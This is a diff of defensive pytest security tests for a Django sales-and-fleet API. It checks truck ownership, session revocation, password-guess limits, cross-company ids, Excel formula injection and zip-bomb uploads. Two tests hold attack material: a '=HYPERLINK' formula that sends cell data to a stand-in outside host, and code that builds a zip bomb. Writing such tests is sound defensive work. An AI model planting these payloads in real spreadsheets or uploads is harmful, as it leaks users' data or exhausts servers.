@@ -469,3 +469,204 @@ def test_approved_and_posted_records_cannot_be_changed_through_the_api(seeded_co
             accepted.append((method.upper(), path, answer.status_code))
     assert not accepted, str(accepted)
     assert _snapshot(seeded_company) == before
+
+
+# ---- P4-T05 follow-up (D-141): holes found after D-108, each closed with its test ----
+
+
+def _member(organization: Any, role: Role, username: str) -> Any:
+    return MembershipFactory.create(role=role, organization=organization, user=UserFactory.create(username=username))
+
+
+def _as(membership: Any) -> APIClient:
+    client = APIClient()
+    client.force_authenticate(membership.user)
+    return client
+
+
+def test_a_driver_cannot_take_the_truck_another_driver_started_the_day_on():
+    """Driver A starts the day on their usual truck (no assignment needed). Driver B then "chose" that truck for
+    the day: A was locked out of their own truck mid-day and B sold A's stock (D-141). Only the office moves it."""
+    from apps.fleet import selectors as fleet
+    from apps.fleet import services as fleet_services
+
+    company = OrganizationFactory.create()
+    owner = _member(company, Role.OWNER, "patron")
+    first = _member(company, Role.DRIVER, "ali")
+    second = _member(company, Role.DRIVER, "sami")
+    truck = fleet_services.create_truck(
+        organization=company, actor=None, name="Camion A", plate="1 TU 1", driver=first.user
+    )
+    fleet_services.create_truck(organization=company, actor=None, name="Camion B", plate="2 TU 2", driver=second.user)
+
+    assert _as(first).post("/api/v1/my-day", {"opening_cash": "20.000"}, format="json").status_code == 201
+
+    taken = _as(second).post("/api/v1/truck-assignments", {"truck": truck.pk}, format="json")
+    assert taken.status_code == 400, taken.status_code
+    assert "truck" in taken.json()
+    mine = fleet.truck_of_driver(first)
+    theirs = fleet.truck_of_driver(second)
+    assert mine is not None
+    assert mine.pk == truck.pk
+    assert theirs is None or theirs.pk != truck.pk
+
+    # The office still decides: it may give the truck to the other driver.
+    moved = _as(owner).post("/api/v1/truck-assignments", {"truck": truck.pk, "driver": second.user.pk}, format="json")
+    assert moved.status_code == 201
+
+
+def test_names_in_excel_exports_stay_text_never_formulas():
+    """A driver names themselves (or a manager names a customer) "=HYPERLINK(...)": the owner's Excel export must
+    show that text, not run it as a formula (D-141)."""
+    import io
+    from decimal import Decimal
+
+    from openpyxl import load_workbook
+
+    from apps.reports.exports import workbook_bytes
+
+    payload = '=HYPERLINK("http://example.org/?"&B2,"Ali")'
+    content = workbook_bytes(
+        title="Ventes",
+        headers=["Libellé", "Montant"],
+        rows=[[payload, Decimal("12.500")], ["=1+1", Decimal("1.000")]],
+        totals=["Total", Decimal("13.500")],
+    )
+    sheet = load_workbook(io.BytesIO(content)).active
+    assert sheet is not None
+    assert sheet["A2"].value == payload
+    assert sheet["A2"].data_type == "s"
+    assert sheet["A3"].data_type == "s"
+    assert sheet["B2"].data_type == "n"
+
+
+def test_old_password_guesses_are_limited():
+    """A session left open on a shared computer must not let someone find the password by trying (D-141)."""
+    client = _as(_member(OrganizationFactory.create(), Role.MANAGER, "gerant"))
+    answers = [
+        client.post(
+            "/api/v1/me/password", {"old_password": f"guess-{n}", "new_password": "Tres-long-mot-2026"}, format="json"
+        ).status_code
+        for n in range(10)
+    ]
+    assert answers[:8] == [400] * 8
+    assert set(answers[8:]) == {429}
+
+
+def _session_of(username: str) -> APIClient:
+    client = APIClient()
+    assert client.login(username=username, password="test-password")
+    assert client.get("/api/v1/me").status_code == 200
+    return client
+
+
+def test_a_deactivated_member_is_logged_out_at_once():
+    """Their open sessions (a phone left logged in) stop working on the next request (D-123, D-141)."""
+    company = OrganizationFactory.create()
+    owner = _member(company, Role.OWNER, "patronne")
+    driver = _member(company, Role.DRIVER, "parti")
+    phone = _session_of("parti")
+
+    assert _as(owner).post(f"/api/v1/members/{driver.pk}/deactivate").status_code == 200
+    assert phone.get("/api/v1/me").status_code == 401
+    assert phone.get("/api/v1/my-stock").status_code == 401
+
+
+def test_a_password_reset_by_the_owner_ends_the_member_sessions():
+    company = OrganizationFactory.create()
+    owner = _member(company, Role.OWNER, "patron2")
+    manager = _member(company, Role.MANAGER, "oublie")
+    browser = _session_of("oublie")
+
+    reset = _as(owner).post(
+        f"/api/v1/members/{manager.pk}/reset-password", {"new_password": "Nouveau-mot-2026"}, format="json"
+    )
+    assert reset.status_code == 204
+    assert browser.get("/api/v1/me").status_code == 401
+
+
+def test_the_import_refuses_a_zip_bomb():
+    """An .xlsx is a zip: a few MB sent may unpack to gigabytes in the server's memory (D-141)."""
+    import io
+    import zipfile
+
+    from apps.dataimport import services as imports
+
+    owner = _member(OrganizationFactory.create(), Role.OWNER, "chargeur")
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
+        archive.writestr("[Content_Types].xml", "<Types/>")
+        with archive.open("xl/sharedStrings.xml", "w", force_zip64=True) as member:
+            chunk = b"\0" * (1024 * 1024)
+            for _ in range(101):
+                member.write(chunk)
+    assert len(buffer.getvalue()) < 5 * 1024 * 1024
+    with pytest.raises(imports.WorkbookError, match="décompressé"):
+        imports.run_import(
+            organization=owner.organization,
+            actor=owner.user,
+            kind_key="suppliers",
+            content=buffer.getvalue(),
+            dry_run=True,
+        )
+
+
+def test_ids_of_another_company_in_a_request_body_are_unknown(seeded_company):
+    """D-022 for ids sent in the body, not the address: another company's customer, product, place, truck, driver
+    or sale is refused on that field, and nothing of either company changes."""
+    from apps.core import services as core_services
+    from apps.core.models import User
+
+    owner = _login("owner")
+    customer = _ids(owner, "customers", {})[0]
+    product = _ids(owner, "products", {})[0]
+    location = _ids(owner, "locations", {})[0]
+    truck = _ids(owner, "trucks", {})[0]
+    sale = _ids(owner, "sales", {})[0]
+    driver = User.objects.get(username="driver").pk
+    other_company = OrganizationFactory.create()
+    other = client_for(Role.OWNER, other_company)
+    stranger = core_services.create_user(username="etranger", password=SEED_PASSWORD)
+    core_services.add_member(organization=other_company, user=stranger, role=Role.DRIVER)
+    line = {"product": product, "quantity": "1.000", "unit_price": "1.000"}
+    cases = [
+        (
+            "sales",
+            {
+                "client_uuid": "6f1d1b8e-5d0c-4a59-9a8e-3d7d1f2c0a11",
+                "customer": customer,
+                "location": location,
+                "lines": [line],
+            },
+            {"customer", "location", "lines.0.product"},
+        ),
+        ("quotes", {"quoted_on": "2026-10-14", "customer": customer, "lines": [line]}, {"customer", "lines.0.product"}),
+        (
+            "transfers",
+            {"from_location": location, "to_location": location, "transferred_on": "2026-10-14", "lines": [line]},
+            {"from_location", "to_location", "lines.0.product"},
+        ),
+        (
+            "losses",
+            {
+                "lost_on": "2026-10-14",
+                "location": location,
+                "product": product,
+                "quantity": "1.000",
+                "reason": "spoiled",
+            },
+            {"location", "product"},
+        ),
+        ("invoices", {"sales": [sale]}, {"sales"}),
+        ("truck-assignments", {"truck": truck, "driver": stranger.pk}, {"truck"}),
+        ("trucks", {"name": "Pris", "plate": "9 TU 9", "driver": driver}, {"driver"}),
+    ]
+    before = _snapshot(seeded_company)
+    wrong = []
+    for path, body, fields in cases:
+        answer = other.post(f"/api/v1/{path}", body, format="json")
+        named = set(answer.json()) if answer.status_code == 400 else set()
+        if answer.status_code != 400 or not named & fields:
+            wrong.append((path, answer.status_code, answer.content[:300]))
+    assert not wrong, "\n".join(map(str, wrong))
+    assert _snapshot(seeded_company) == before
